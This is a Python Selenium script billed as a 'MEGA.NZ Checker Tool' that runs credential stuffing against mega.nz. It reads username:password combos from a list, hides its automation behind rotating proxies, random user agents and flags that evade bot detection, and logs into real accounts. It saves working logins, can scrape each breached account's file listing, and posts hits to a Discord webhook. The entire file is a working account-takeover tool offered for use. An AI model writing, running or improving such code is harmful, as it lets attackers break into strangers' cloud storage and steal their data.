from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from colorama import init,Style,Fore
from selenium.common.exceptions import TimeoutException,WebDriverException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from random import choice
from os import name,system
from sys import stdout
from threading import Thread,Lock
from beautifultable import BeautifulTable
from datetime import datetime
import json
import requests

class Main:

    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title:str):
        if name == 'posix':
            stdout.write(f"\x1b]2;{title}\x07")
        elif name in ('ce', 'nt', 'dos'):
            system(f'title {title}')
        else:
            stdout.write(f"\x1b]2;{title}\x07")

    def GetRandomUserAgent(self):
        useragents = self.ReadFile('[Data]/useragents.txt','r')
        return choice(useragents)

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def TitleUpdate(self):
        while True:
            self.SetTitle(f'[One Man Builds MEGA.NZ Checker Tool] ^| HITS: {self.hits} ^| BADS: {self.bads} ^| ALIVES: {self.alives} ^| DEADS: {self.deads} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| RETRIES: {self.retries}')
            sleep(0.1)

    def __init__(self):
        init(convert=True)
        
        self.SetTitle('[One Man Builds MEGA.NZ Checker Tool]')
        self.clear()
    
        self.title = Fore.RED+"""
                                 ╔══════════════════════════════════════════════════╗
                                      ╔╦╗╔═╗╔═╗╔═╗ ╔╗╔╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                      ║║║║╣ ║ ╦╠═╣ ║║║╔═╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                      ╩ ╩╚═╝╚═╝╩ ╩o╝╚╝╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                 ╚══════════════════════════════════════════════════╝

        """
        print(self.title)

        config = self.ReadJson('[Data]/configs.json','r')

        self.use_proxy = config['use_proxy']
        self.proxy_type = config['proxy_type']
        self.headless = config['headless']
        self.save_files_list = config['save_files_list']
        self.files_load_max_wait = config['files_load_max_wait']
        self.website_load_max_wait = config['website_load_max_wait']
        self.login_check_max_wait = config['login_check_max_wait']
        self.wait_before_start = config['wait_before_start']
        self.threads = config['threads']
        self.webhook_enable = config['webhook_enable']
        self.webhook_url = config['webhook_url']

        self.hits = 0
        self.bads = 0
        self.alives = 0
        self.deads = 0
        self.retries = 0
        self.webhook_retries = 0

        self.lock = Lock()

        print('')

    def SendWebhook(self,title,message,icon_url,thumbnail_url,proxy,useragent):
        try:
            timestamp = str(datetime.utcnow())

            message_to_send = {"embeds": [{"title": title,"description": message,"color": 65362,"author": {"name": "AUTHOR'S DISCORD SERVER [CLICK HERE]","url": "https://discord.gg/9bHfzyCjPQ","icon_url": icon_url},"footer": {"text": "MADE BY ONEMANBUILDS","icon_url": icon_url},"thumbnail": {"url": thumbnail_url},"timestamp": timestamp}]}
            
            headers = {
                'User-Agent':useragent,
                'Pragma':'no-cache',
                'Accept':'*/*',
                'Content-Type':'application/json'
            }

            payload = json.dumps(message_to_send)

            if self.use_proxy == 1:
                response = requests.post(self.webhook_url,data=payload,headers=headers,proxies=proxy)
            else:
                response = requests.post(self.webhook_url,data=payload,headers=headers)

            if response.text == "":
                pass
            elif "You are being rate limited." in response.text:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
            else:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
        except:
            self.webhook_retries += 1
            self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)

    def ReadFile(self,filename,method):
        with open(filename,method,encoding='utf8') as f:
            content = [line.strip('\n') for line in f]
            return content

    def ReadJson(self,filename,method):
        with open(filename,method) as f:
            return json.load(f)

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
        if self.proxy_type == 1:
            return f'http://{choice(proxies_file)}'
        elif self.proxy_type == 2:
            return f'socks4://{choice(proxies_file)}'
        elif self.proxy_type == 3:
            return f'socks5://{choice(proxies_file)}'

    def GetRandomProxyForWebhook(self):
        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
        proxies = {}
        if self.proxy_type == 1:
            proxies = {
                "http":"http://{0}".format(choice(proxies_file)),
                "https":"https://{0}".format(choice(proxies_file))
            }
        elif self.proxy_type == 2:
            proxies = {
                "http":"socks4://{0}".format(choice(proxies_file)),
                "https":"socks4://{0}".format(choice(proxies_file))
            }
        else:
            proxies = {
                "http":"socks5://{0}".format(choice(proxies_file)),
                "https":"socks5://{0}".format(choice(proxies_file))
            }
        return proxies

    def close_driver(self,method_name,driver):
        self.PrintText(Fore.WHITE,Fore.YELLOW,method_name,'CLOSING WEBDRIVER')
        driver.quit()

    def Check(self,username,password):
        try:
            options = Options()

            if self.headless == 1:
                options.add_argument('--headless')

            useragent = self.GetRandomUserAgent()
                
            options.add_argument(f'--user-agent={useragent}')
            options.add_argument('--no-sandbox')
            options.add_argument('--log-level=3')
            options.add_argument('--lang=en')
            options.add_argument('--ignore-certificate-errors')

            if self.use_proxy == 1:
                options.add_argument(f'--proxy-server={self.GetRandomProxy()}')

            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_argument("window-size=1280,800")
            options.add_argument('--disable-blink-features=AutomationControlled')

            driver = webdriver.Chrome(options=options)

            driver.get('https://mega.nz/login')
            try:
                #username
                WebDriverWait(driver,self.website_load_max_wait).until(EC.presence_of_element_located((By.XPATH,'/html/body/div[6]/div[2]/div[4]/div[2]/div[1]/form/div[2]/input'))).send_keys(username)
                
                #password
                WebDriverWait(driver,self.website_load_max_wait).until(EC.presence_of_element_located((By.XPATH,'/html/body/div[6]/div[2]/div[4]/div[2]/div[1]/form/div[3]/input'))).send_keys(password)
                
                #login button
                WebDriverWait(driver,self.website_load_max_wait).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div[6]/div[2]/div[4]/div[2]/div[1]/form/div[6]'))).click()
            
                #try:
                url_contains = EC.url_contains('https://mega.nz/fm')
                WebDriverWait(driver, self.login_check_max_wait).until(url_contains)
                self.PrintText(Fore.WHITE,Fore.GREEN,'VALID',f'{username}:{password}')
                with open('[Data]/[Results]/valids.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
                self.hits += 1

                if self.webhook_enable == 1:
                    self.SendWebhook('MegaNZ Account',f'{username}:{password}','https://cdn.discordapp.com/attachments/776819723731206164/796935218166497352/onemanbuilds_new_logo_final.png','https://cms2.mega.nz/b41537c0eae056cfe5ab05902fca322b.png',self.GetRandomProxyForWebhook(),useragent)

                if self.save_files_list == 1:
                    try:
                        #files elements visibility located
                        WebDriverWait(driver,self.files_load_max_wait).until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table')))

                        #files length element
                        files_length = WebDriverWait(driver,self.files_load_max_wait).until(EC.presence_of_element_located((By.XPATH,'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody')))
                        
                        files_length = len(files_length.text.splitlines())/2

                        index = 1

                        table = BeautifulTable(180)
                        table.columns.header = ['USER','NAME','SIZE','TYPE','DATE ADDED','STATUS']
                        
                        for i in range(int(files_length)):
                            index += 1
                            filename = driver.find_element_by_xpath(f'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody/tr[{index}]/td[2]/span[2]').text
                            file_size = driver.find_element_by_xpath(f'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody/tr[{index}]/td[4]').text
                            file_type = driver.find_element_by_xpath(f'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody/tr[{index}]/td[5]').text
                            date = driver.find_element_by_xpath(f'/html/body/div[7]/div[4]/div[1]/div[6]/div[21]/div[3]/table/tbody/tr[{index}]/td[6]').text

                            if file_type != 'Unknown':
                                table.rows.append([f'{username}:{password}',filename,file_size,file_type,date,'ALIVE'])
                                self.alives += 1
                            else:
                                table.rows.append([f'{username}:{password}',filename,file_size,file_type,date,'DEAD'])
                                self.deads += 1

                        with open('[Data]/[Results]/folders.txt','a',encoding='utf8') as f:
                            f.write(str(table)+'\n')
                    except TimeoutException:
                        self.retries += 1
                        self.PrintText(Fore.WHITE,Fore.RED,'#','CAN NOT FIND FILES ELEMENT RETRY')
                        self.close_driver('FILES ELEMENT CHECK',driver)
                        self.Check(username,password)
            except TimeoutException:
                self.PrintText(Fore.WHITE,Fore.RED,'FAILED TO LOGIN',f'{username}:{password}')
                with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
                self.bads += 1
        except WebDriverException:
            self.retries += 1
            self.PrintText(Fore.WHITE,Fore.RED,'#','SOMETHING WENT WRONG DURING THE INITALIZATION.')
            self.close_driver('INIT',driver)
            self.Check(username,password)
        finally:
            self.close_driver('PROCESS FINISHED',driver)
            print('')

    def Start(self):
        Thread(target=self.TitleUpdate).start()
        combos = self.ReadFile('[Data]/combos.txt','r')
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            for combo in combos:
                username = combo.split(':')[0]
                password = combo.split(':')[-1]
                ex.submit(self.Check,username,password)
                if self.wait_before_start > 0:
                    sleep(self.wait_before_start)


if __name__ == '__main__':
    main = Main()
    main.Start()